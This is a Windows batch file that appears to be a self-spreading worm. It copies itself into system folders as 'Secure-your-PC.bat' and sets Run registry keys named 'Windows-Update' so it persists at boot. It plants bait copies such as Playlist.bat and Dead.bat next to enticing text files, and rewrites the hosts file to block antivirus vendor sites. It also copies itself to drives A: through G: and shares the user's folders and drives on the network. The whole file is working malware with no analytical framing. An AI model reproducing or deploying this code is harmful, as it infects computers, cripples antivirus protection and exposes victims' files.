@echo off
rem Whitesmoke by Whitepowder aka PUNeumann
rem Ons sal lewe, ons sal sterwe,
rem Ons vir jou, Suid-Afrika!!!

copy %0 %windir%\Secure-your-PC.bat
copy %0 %windir%\System\Secure-your-PC.bat
copy %0 %windir%\System32\Secure-your-PC.bat
%random%%random%%random%%random%%random%%random%%random%
%random%%random%%random%%random%%random%%random%%random%
%random%%random%%random%%random%%random%%random%%random%
%random%%random%%random%%random%%random%%random%%random%
%random%%random%%random%%random%%random%%random%%random%
%random%%random%%random%%random%%random%%random%%random%
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Windows-Update /t REG_SZ /d %windir%\Secure-your-PC.bat /f > nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Windows-Update /t REG_SZ /d %windir%\Secure-your-PC.bat /f > nul

copy %0 "%USERPROFILE%\My Documents\Password.bat" > nul
copy %0 "%USERPROFILE%\My Documents\My Music\Playlist.bat" > nul
copy %0 "%USERPROFILE%\My Documents\My Pictures\Dead.bat" > nul
echo Open Playlist.bat and listen to the newest music avaible! > "%USERPROFILE%\My Documents\My Music\Playlist.txt"
echo Open Dead.bat to see one of my friends get shot! > "%USERPROFILE%\My Documents\My Pictures\Dead.txt"

echo 127.0.0.1 www.avast.com > %windir%\system32\drivers\etc\hosts
echo 127.0.0.1 www.eset.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1 www.grisoft.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1 www.kaspersky.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1 www.mcafee.com >> %windir%\system32\drivers\etc\hosts
echo 127.0.0.1 www.symantec.com >> %windir%\system32\drivers\etc\hosts

copy %0 "A:\Secure-your-PC.bat"
copy %0 "C:\Secure-your-PC.bat"
copy %0 "D:\Secure-your-PC.bat"
copy %0 "E:\Secure-your-PC.bat"
copy %0 "F:\Secure-your-PC.bat"
copy %0 "G:\Secure-your-PC.bat"

net share My Documents="%USERPROFILE%\My Documents" > nul
net share My Music="%USERPROFILE%\My Documents\My Music" > nul
net share My Pictures="%USERPROFILE%\My Documents\My Pictures" > nul
net share A=a:
net share C=c:
net share D=d:
net share E=e:
net share F=f:
net share G=g: